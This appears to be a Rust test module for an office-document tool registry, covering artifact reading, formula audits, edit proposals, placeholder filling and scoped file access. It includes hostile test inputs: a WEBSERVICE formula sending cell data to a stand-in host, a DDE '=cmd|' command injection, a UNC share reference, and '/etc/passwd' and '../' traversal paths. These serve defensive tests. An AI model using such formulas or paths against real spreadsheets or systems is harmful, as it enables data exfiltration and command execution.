}

impl Tool for ClipboardRead {
    fn spec(&self) -> &ToolSpec {
        &self.spec
    }

    fn call(&self, ctx: &ToolContext<'_>, _args: &Value) -> Result<Value, ToolError> {
        match ctx.host_inputs.get("clipboard").and_then(Value::as_str) {
            Some(text) => Ok(json!({"text": text, "chars": text.chars().count()})),
            None => Err(ToolError::Unavailable(
                self.spec.id.clone(),
                "clipboard text was not attached by a visible user action".into(),
            )),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::tools::{ArtifactSource, MemoryArtifacts, ToolRegistry};
    use std::sync::atomic::AtomicBool;

    fn repo_root() -> std::path::PathBuf {
        std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../..")
            .canonicalize()
            .unwrap()
    }

    fn fixture(name: &str) -> Vec<u8> {
        std::fs::read(repo_root().join("fixtures/office").join(name)).unwrap()
    }

    fn allow(ids: &[&str]) -> BTreeSet<String> {
        ids.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn detect_kind_by_content() {
        assert_eq!(detect_kind(&fixture("board_demo.xlsx")), ArtifactKind::Xlsx);
        assert_eq!(detect_kind(&fixture("structured.docx")), ArtifactKind::Docx);
        assert_eq!(detect_kind(&fixture("hello.pdf")), ArtifactKind::Pdf);
        assert_eq!(detect_kind(b"plain text"), ArtifactKind::Text);
        assert_eq!(detect_kind(&[0xff, 0xfe, 0x00]), ArtifactKind::Unknown);
    }

    #[test]
    fn artifact_read_returns_hashes_for_every_kind() {
        let arts = MemoryArtifacts::new()
            .with("wb", "board_demo.xlsx", fixture("board_demo.xlsx"))
            .with("doc", "structured.docx", fixture("structured.docx"))
            .with("pdf", "hello.pdf", fixture("hello.pdf"))
            .with("txt", "notes.txt", b"line one\nline two".to_vec());
        let host = json!({});
        let cancel = AtomicBool::new(false);
        let ctx = ToolContext::new(&arts, &host, &cancel);
        let r = ToolRegistry::builtin();
        let a = allow(&["artifact.read"]);
        let wb = r
            .call(&ctx, "artifact.read", &json!({"artifact_id": "wb"}), &a)
            .unwrap()
            .output;
        assert_eq!(wb["kind"], "xlsx");
        let cells = wb["sheets"][0]["cells"].as_array().unwrap();
        assert!(cells.iter().any(|c| c["formula"]
            .as_str()
            .map(|f| f.contains("SUM"))
            .unwrap_or(false)));
        assert!(cells
            .iter()
            .all(|c| c["content_hash"].as_str().unwrap().len() == 64));
        let doc = r
            .call(&ctx, "artifact.read", &json!({"artifact_id": "doc"}), &a)
            .unwrap()
            .output;
        assert_eq!(doc["kind"], "docx");
        assert_eq!(doc["paragraphs"][0]["text"], "Harbor Plan");
        assert_eq!(doc["paragraphs"][0]["target_id"], "p:1");
        let pdf = r
            .call(&ctx, "artifact.read", &json!({"artifact_id": "pdf"}), &a)
            .unwrap()
            .output;
        assert_eq!(pdf["kind"], "pdf");
        assert!(pdf["page_count"].as_u64().unwrap() >= 1);
        let txt = r
            .call(&ctx, "artifact.read", &json!({"artifact_id": "txt"}), &a)
            .unwrap()
            .output;
        assert_eq!(txt["text"], "line one\nline two");
        // An artifact not attached to the run is a typed unavailability.
        assert!(matches!(
            r.call(&ctx, "artifact.read", &json!({"artifact_id": "nope"}), &a),
            Err(ToolError::Unavailable(_, _))
        ));
    }

    #[test]
    fn qualified_function_set_comes_from_the_authority_file() {
        let q = qualified_functions();
        for f in [
            "SUM", "VLOOKUP", "IFERROR", "TEXTJOIN", "STDEV.S", "EOMONTH",
        ] {
            assert!(q.contains(f), "{f}");
        }
        assert!(!q.contains("ARITHMETIC_OPERATORS"));
        assert_eq!(q.len(), 66);
    }

    #[test]
    fn formula_audit_recalculates_on_a_private_copy() {
        let arts = MemoryArtifacts::new().with("wb", "board_demo.xlsx", fixture("board_demo.xlsx"));
        let host = json!({});
        let cancel = AtomicBool::new(false);
        let ctx = ToolContext::new(&arts, &host, &cancel);
        let r = ToolRegistry::builtin();
        let out = r
            .call(
                &ctx,
                "formula.audit",
                &json!({"artifact_id": "wb"}),
                &allow(&["formula.audit"]),
            )
            .unwrap()
            .output;
        assert_eq!(out["recalculated"], true);
        assert_eq!(out["formula_cells"], 2);
        assert_eq!(out["after"]["verified_cells"], 2);
        assert_eq!(out["static"]["errors"].as_array().unwrap().len(), 0);
        assert_eq!(out["unsupported"].as_array().unwrap().len(), 0);
        // The attached bytes are untouched (audit works on a copy).
        assert_eq!(
            harbor_canonical::sha256_hex(&arts.get("wb").unwrap().bytes),
            out["content_hash"]
        );
    }

    #[test]
    fn propose_batch_binds_preconditions_and_output_hash() {
        let arts =
            MemoryArtifacts::new().with("doc", "structured.docx", fixture("structured.docx"));
        let host = json!({});
        let cancel = AtomicBool::new(false);
        let ctx = ToolContext::new(&arts, &host, &cancel);
        let r = ToolRegistry::builtin();
        let a = allow(&["artifact.read", "artifact.propose_batch"]);
        let doc = r
            .call(&ctx, "artifact.read", &json!({"artifact_id": "doc"}), &a)
            .unwrap()
            .output;
        let p = &doc["paragraphs"][0];
        let ok = r
            .call(
                &ctx,
                "artifact.propose_batch",
                &json!({"artifact_id": "doc", "operations": [{"kind": "text.replace", "target_id": p["target_id"], "expected_content_hash": p["content_hash"], "args": {"text": "Harbor Plan v2"}}]}),
                &a,
            )
            .unwrap()
            .output;
        assert_eq!(ok["op_count"], 1);
        assert_eq!(ok["proposed_output_hash"].as_str().unwrap().len(), 64);
        assert_ne!(ok["proposed_output_hash"], ok["base_content_hash"]);
        // Determinism: the same proposal hashes to the same output.
        let again = r
            .call(
                &ctx,
                "artifact.propose_batch",
                &json!({"artifact_id": "doc", "operations": [{"kind": "text.replace", "target_id": p["target_id"], "expected_content_hash": p["content_hash"], "args": {"text": "Harbor Plan v2"}}]}),
                &a,
            )
            .unwrap()
            .output;
        assert_eq!(ok["proposed_output_hash"], again["proposed_output_hash"]);
        // A stale precondition is refused, never overwritten.
        let stale = r.call(
            &ctx,
            "artifact.propose_batch",
            &json!({"artifact_id": "doc", "operations": [{"kind": "text.replace", "target_id": "p:1", "expected_content_hash": "0".repeat(64), "args": {"text": "x"}}]}),
            &a,
        );
        assert!(stale
            .unwrap_err()
            .to_string()
            .contains("precondition mismatch"));
    }

    #[test]
    fn placeholders_and_fill_never_invent_values() {
        // structured.docx has no placeholders; use a text artifact for the
        // inventory and check the DOCX-only fill contract separately.
        let arts = MemoryArtifacts::new()
            .with(
                "t",
                "letter.txt",
                b"Dear {{name}},\nYour balance is $AMOUNT$ as of [DATE].\nRegards, <<sender>>"
                    .to_vec(),
            )
            .with("doc", "structured.docx", fixture("structured.docx"));
        let host = json!({});
        let cancel = AtomicBool::new(false);
        let ctx = ToolContext::new(&arts, &host, &cancel);
        let r = ToolRegistry::builtin();
        let a = allow(&["artifact.placeholders", "artifact.fill_placeholders"]);
        let inv = r
            .call(
                &ctx,
                "artifact.placeholders",
                &json!({"artifact_id": "t"}),
                &a,
            )
            .unwrap()
            .output;
        assert_eq!(inv["keys"], json!(["AMOUNT", "DATE", "name", "sender"]));
        assert_eq!(inv["count"], 4);
        assert_eq!(inv["placeholders"][0]["paragraph_index"], 1);
        // No placeholders in the fixture document → empty proposal, no batch.
        let fill = r
            .call(
                &ctx,
                "artifact.fill_placeholders",
                &json!({"artifact_id": "doc", "values": {"name": "x"}}),
                &a,
            )
            .unwrap()
            .output;
        assert_eq!(fill["op_count"], 0);
        assert!(fill["batch"].is_null());
    }

    #[test]
    fn formula_audit_finds_every_error_class_on_the_eval_fixture() {
        let arts = MemoryArtifacts::new().with(
            "wb",
            "formula_errors.xlsx",
            fixture("formula_errors.xlsx"),
        );
        let host = json!({});
        let cancel = AtomicBool::new(false);
        let ctx = ToolContext::new(&arts, &host, &cancel);
        let r = ToolRegistry::builtin();
        let out = r
            .call(
                &ctx,
                "formula.audit",
                &json!({"artifact_id": "wb"}),
                &allow(&["formula.audit"]),
            )
            .unwrap()
            .output;
        let codes = &out["static"]["counts_by_code"];
        assert_eq!(codes["#DIV/0!"], 1, "{out}");
        assert_eq!(codes["#REF!"], 1, "{out}");
        assert_eq!(codes["#NAME?"], 1, "{out}");
        assert_eq!(codes["#N/A"], 1, "{out}");
        let dangling = out["static"]["dangling_references"].as_array().unwrap();
        assert_eq!(dangling.len(), 1);
        assert_eq!(dangling[0]["missing_sheets"], json!(["Missing"]));
        let unsupported = out["unsupported"].as_array().unwrap();
        assert_eq!(unsupported.len(), 1);
        assert_eq!(unsupported[0]["functions"], json!(["FOO"]));
        assert_eq!(out["recalculated"], true);
        // Healthy formulas verify; the pinned engine reproduces the errors.
        assert!(
            out["after"]["verified_cells"].as_u64().unwrap() >= 2,
            "{}",
            out["after"]
        );
        assert!(
            out["after"]["counts_by_code"]["#DIV/0!"].as_u64().unwrap() >= 1,
            "{}",
            out["after"]
        );
        // Every finding carries a schema-safe target id and a content hash.
        for e in out["static"]["errors"].as_array().unwrap() {
            assert!(e["target_id"].as_str().unwrap().starts_with("cell:Budget:"));
            assert_eq!(e["content_hash"].as_str().unwrap().len(), 64);
        }
    }

    #[test]
    fn fill_placeholders_on_the_eval_template_leaves_other_paragraphs_alone() {
        let arts = MemoryArtifacts::new().with(
            "tpl",
            "letter_template.docx",
            fixture("letter_template.docx"),
        );
        let host = json!({});
        let cancel = AtomicBool::new(false);
        let ctx = ToolContext::new(&arts, &host, &cancel);
        let r = ToolRegistry::builtin();
        let a = allow(&["artifact.placeholders", "artifact.fill_placeholders"]);
        let inv = r
            .call(
                &ctx,
                "artifact.placeholders",
                &json!({"artifact_id": "tpl"}),
                &a,
            )
            .unwrap()
            .output;
        assert_eq!(inv["keys"], json!(["AMOUNT", "name", "ref", "sender"]));
        let fill = r
            .call(
                &ctx,
                "artifact.fill_placeholders",
                &json!({"artifact_id": "tpl", "values": {"name": "Amina", "ref": "HB-42", "AMOUNT": "1,250.00"}}),
                &a,
            )
            .unwrap()
            .output;
        // Paragraphs 2 and 3 are fully mapped; paragraph 5 needs `sender`.
        assert_eq!(fill["op_count"], 2, "{fill}");
        assert_eq!(fill["unmapped"], json!(["sender"]));
        assert_eq!(fill["skipped_paragraphs"], json!([5]));
        assert_eq!(fill["preview"][0]["after"], "Dear Amina,");
        assert_eq!(
            fill["preview"][1]["after"],
            "Your reference is HB-42 and the amount due is 1,250.00."
        );
        assert_eq!(fill["proposed_output_hash"].as_str().unwrap().len(), 64);
        // The proposed output still contains the untouched paragraph and the
        // unmapped marker, and no filled marker.
        let batch = fill["batch"].clone();
        assert_eq!(batch["operations"][0]["kind"], "text.replace");
        assert_eq!(batch["operations"][0]["precondition"]["target_id"], "p:2");
    }

    #[test]
    fn formula_content_gate_refuses_unqualified_functions_and_external_references() {
        let sheets = vec!["Budget".to_string()];
        assert!(check_formula_allowed("=SUM(B2:B3)", &sheets).is_ok());
        assert!(check_formula_allowed("=IF(Budget!B2>0,ROUND(B2/3,2),0)", &sheets).is_ok());
        // Text inside a string literal is opaque data, not a reference.
        assert!(check_formula_allowed(r#"="see [notes] at x://y"&A1"#, &sheets).is_ok());
        for bad in [
            r#"=WEBSERVICE("https://x.example/?"&A1)"#,
            r#"=HYPERLINK("https://x.example", "go")"#,
            "='\\\\srv\\share\\[Budget.xlsx]Data'!A1",
            "=[Other.xlsx]Sheet1!A1",
            "=cmd|'/c calc'!A0",
            "=Missing!A1",
            "=FOO(B2)",
            "=",
        ] {
            let err = check_formula_allowed(bad, &sheets).unwrap_err();
            assert!(!err.is_empty(), "{bad}");
        }
        // Without workbook facts the sheet check is skipped, the rest holds.
        assert!(check_formula_allowed("=Other!A1", &[]).is_ok());
        assert!(check_formula_allowed("=WEBSERVICE(A1)", &[]).is_err());
    }

    #[test]
    fn build_operations_refuses_model_formulas_outside_the_gate() {
        let audit = json!({
            "sheets": ["Budget"],
            "static": {"errors": [
                {"sheet": "Budget", "address": "B4", "target_id": "cell:Budget:B4", "content_hash": "a".repeat(64), "formula": "B2/B3"}
            ]}
        });
        let build = FormulaBuildOperations::new();
        let artifacts = MemoryArtifacts::new();
        let cancel = AtomicBool::new(false);
        let host = json!({});
        let ctx = ToolContext {
            artifacts: &artifacts,
            knowledge: None,
            provider: None,
            model: None,
            workspace_root: None,
            host_inputs: &host,
            cancel: &cancel,
            trace_key: None,
            deadline: None,
        };
        let out = build
            .call(
                &ctx,
                &json!({"audit": audit, "decisions": [
                    {"sheet": "Budget", "address": "B4", "action": "fix", "formula": "=WEBSERVICE(\"https://x/\"&B2)", "reason": "r"},
                    {"sheet": "Budget", "address": "B4", "action": "fix", "formula": "=IFERROR(B2/B3,0)", "reason": "r"}
                ]}),
            )
            .unwrap();
        assert_eq!(out["operations"].as_array().unwrap().len(), 1, "{out}");
        assert_eq!(out["operations"][0]["args"]["value"], "=IFERROR(B2/B3,0)");
        assert_eq!(out["rejected"].as_array().unwrap().len(), 1);
        assert!(out["rejected"][0]["reason"]
            .as_str()
            .unwrap()
            .contains("WEBSERVICE"));
    }

    #[test]
    fn build_operations_copies_hashes_and_rejects_non_fixes() {
        let arts = MemoryArtifacts::new().with(
            "wb",
            "formula_errors.xlsx",
            fixture("formula_errors.xlsx"),
        );
        let host = json!({});
        let cancel = AtomicBool::new(false);
        let ctx = ToolContext::new(&arts, &host, &cancel);
        let r = ToolRegistry::builtin();
        let a = allow(&["formula.audit", "formula.build_operations"]);
        let audit = r
            .call(&ctx, "formula.audit", &json!({"artifact_id": "wb"}), &a)
            .unwrap()
            .output;
        let out = r
            .call(
                &ctx,
                "formula.build_operations",
                &json!({"audit": audit, "decisions": [
                    {"sheet": "Budget", "address": "B6", "action": "fix", "formula": "=Budget!A1", "reason": "only one sheet exists"},
                    {"sheet": "Budget", "address": "B4", "action": "fix", "formula": "=B2/B3", "reason": "unchanged"},
                    {"sheet": "Budget", "address": "B7", "action": "review", "reason": "unqualified", "options": ["replace"]},
                    {"sheet": "Budget", "address": "Z99", "action": "fix", "formula": "=1", "reason": "invented"},
                    {"sheet": "Budget", "address": "B8", "action": "fix", "reason": "no formula"}
                ]}),
                &a,
            )
            .unwrap()
            .output;
        let ops = out["operations"].as_array().unwrap();
        assert_eq!(ops.len(), 1, "{out}");
        assert_eq!(ops[0]["target_id"], "cell:Budget:B6");
        assert_eq!(ops[0]["expected_content_hash"].as_str().unwrap().len(), 64);
        assert_eq!(ops[0]["args"]["value"], "=Budget!A1");
        assert_eq!(out["review"].as_array().unwrap().len(), 1);
        let rejected = out["rejected"].as_array().unwrap();
        assert_eq!(rejected.len(), 3, "{out}");
        assert!(rejected
            .iter()
            .any(|x| x["reason"].as_str().unwrap().contains("unchanged")));
        assert!(rejected
            .iter()
            .any(|x| x["reason"].as_str().unwrap().contains("no finding")));
        assert!(rejected
            .iter()
            .any(|x| x["reason"].as_str().unwrap().contains("without a formula")));
    }

    #[test]
    fn verify_fields_and_detect_language_are_deterministic() {
        let arts = MemoryArtifacts::new();
        let host = json!({});
        let cancel = AtomicBool::new(false);
        let ctx = ToolContext::new(&arts, &host, &cancel);
        let r = ToolRegistry::builtin();
        let a = allow(&["text.verify_fields", "text.detect_language"]);
        let v = r
            .call(
                &ctx,
                "text.verify_fields",
                &json!({"source": "Omar will write the plan by Friday 26 September.", "item": {"text": "Write the plan", "owner": "Omar", "due": "2023-09-26"}, "fields": ["owner", "due"]}),
                &a,
            )
            .unwrap()
            .output;
        assert_eq!(v["item"]["owner"], "Omar");
        assert!(v["item"]["due"].is_null());
        assert_eq!(v["dropped"][0]["field"], "due");
        let ar = r
            .call(
                &ctx,
                "text.detect_language",
                &json!({"text": "سارة: نحتاج إلى قرار بشأن نقل الأرشيف"}),
                &a,
            )
            .unwrap()
            .output;
        assert_eq!(ar["code"], "ar");
        let en = r
            .call(
                &ctx,
                "text.detect_language",
                &json!({"text": "Let's decide on the archive migration."}),
                &a,
            )
            .unwrap()
            .output;
        assert_eq!(en["code"], "en");
        let und = r
            .call(
                &ctx,
                "text.detect_language",
                &json!({"text": "12345 ---"}),
                &a,
            )
            .unwrap()
            .output;
        assert_eq!(und["code"], "und");
    }

    #[test]
    fn clipboard_requires_host_attachment() {
        let arts = MemoryArtifacts::new();
        let cancel = AtomicBool::new(false);
        let r = ToolRegistry::builtin();
        let a = allow(&["clipboard.read"]);
        let empty = json!({});
        let ctx = ToolContext::new(&arts, &empty, &cancel);
        assert!(matches!(
            r.call(&ctx, "clipboard.read", &json!({}), &a),
            Err(ToolError::Unavailable(_, _))
        ));
        let host = json!({"clipboard": "pasted"});
        let ctx = ToolContext::new(&arts, &host, &cancel);
        assert_eq!(
            r.call(&ctx, "clipboard.read", &json!({}), &a)
                .unwrap()
                .output["text"],
            "pasted"
        );
    }

    #[test]
    fn workspace_file_reads_are_scoped() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("a.txt"), b"hello").unwrap();
        let arts = MemoryArtifacts::new();
        let host = json!({});
        let cancel = AtomicBool::new(false);
        let mut ctx = ToolContext::new(&arts, &host, &cancel);
        ctx.workspace_root = Some(dir.path().to_path_buf());
        let r = ToolRegistry::builtin();
        let a = allow(&["fs.read_workspace_file"]);
        let ok = r
            .call(
                &ctx,
                "fs.read_workspace_file",
                &json!({"path": "a.txt"}),
                &a,
            )
            .unwrap()
            .output;
        assert_eq!(ok["text"], "hello");
        for bad in ["../a.txt", "/etc/passwd"] {
            let err = r
                .call(&ctx, "fs.read_workspace_file", &json!({"path": bad}), &a)
                .unwrap_err();
            assert!(
                err.to_string().contains("escape") || err.to_string().contains("relative"),
                "{bad}: {err}"
            );
        }
    }
}
